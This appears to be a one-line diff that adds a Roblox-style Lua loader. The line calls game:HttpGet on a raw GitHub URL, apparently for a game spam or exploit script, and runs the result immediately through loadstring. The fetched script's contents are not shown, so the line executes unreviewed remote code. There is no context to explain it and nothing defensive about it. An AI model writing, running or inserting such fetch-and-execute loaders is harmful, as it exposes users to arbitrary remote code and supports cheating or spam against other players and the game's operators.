@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/makeup-star-spam1-nbr75y4bij4u6y.lua"))()
